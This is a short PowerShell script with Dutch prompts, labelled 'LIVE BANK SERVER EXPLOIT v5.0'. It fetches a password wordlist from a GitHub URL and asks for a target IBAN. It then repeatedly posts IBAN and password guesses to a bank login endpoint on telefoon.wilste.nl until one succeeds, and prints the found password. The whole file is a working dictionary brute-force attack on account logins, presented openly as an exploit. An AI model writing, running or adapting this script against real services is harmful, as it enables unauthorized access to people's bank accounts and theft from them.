$Host.UI.RawUI.ForegroundColor = "Green"

do {
    Clear-Host
    Write-Host "======================================================"
    Write-Host "          LIVE BANK SERVER EXPLOIT v5.0"
    Write-Host "======================================================"
    Write-Host ""

    Write-Host "[1] VOORBEREIDING"
    $urlList = Read-Host "Plak de URL van de GitHub Wordlist (Raw)"

    try {
        $wordlist = (Invoke-WebRequest -Uri $urlList -UseBasicParsing -ErrorAction Stop).Content -split "`n" | ForEach-Object { $_.Trim() }
        Write-Host "SUCCES: $($wordlist.Count) wachtwoorden geladen van GitHub." -ForegroundColor Cyan
    } catch {
        Write-Host "[FOUT] Kon GitHub lijst niet ophalen. Controleer de link!" -ForegroundColor Red
        $pauze = Read-Host "Druk op Enter om opnieuw te proberen..."
        $keuze = "j"
        continue
    }

    Write-Host ""
    Write-Host "[2] TARGETING"
    $iban = Read-Host "Voer het doelwit IBAN in"
    Write-Host ""
    Write-Host "Verbinding maken met: https://telefoon.wilste.nl..."
    Start-Sleep -Seconds 1
    Write-Host "------------------------------------------------------"

    # Stap 3: De Aanval
    $apiUrl = "https://telefoon.wilste.nl/bank/verify-login"
    $gevonden = $false

    # De aanvalscyclus
    foreach ($gok in $wordlist) {
        if ([string]::IsNullOrWhiteSpace($gok)) { continue }

        $body = @{
            iban     = $iban
            password = $gok
        } | ConvertTo-Json

        try {
            # Gebruik -ErrorAction SilentlyContinue om 401/403 fouten zelf af te handelen
            $response = Invoke-RestMethod -Uri $apiUrl -Method Post -Body $body -ContentType "application/json" -ErrorAction SilentlyContinue

            if ($response.success -eq $true) {
                Write-Host ""
                Write-Host "******************************************************" -ForegroundColor Green
                Write-Host "    [SUCCESS] MATCH GEVONDEN!"
                Write-Host "    WACHTWOORD: $gok"
                Write-Host "******************************************************" -ForegroundColor Green
                $gevonden = $true
                break
            }
        } catch {
            # Hier vang je echte verbindingsfouten op
            Write-Host "Verbindingsfout bij: $gok" -ForegroundColor Red
        }

        Write-Host "PROBEREN: $gok ... [GEWEIGERD]" -ForegroundColor Gray
        Start-Sleep -Milliseconds 150
    }

    if (-not $gevonden) {
        Write-Host ""
        Write-Host "[FAIL] Geen match gevonden. Probeer een andere lijst." -ForegroundColor Yellow
    }

    Write-Host ""
    $keuze = Read-Host "Scherm resetten voor een nieuw thema? (j/n)"

} while ($keuze -eq "j")

Write-Host "Systeem afgesloten."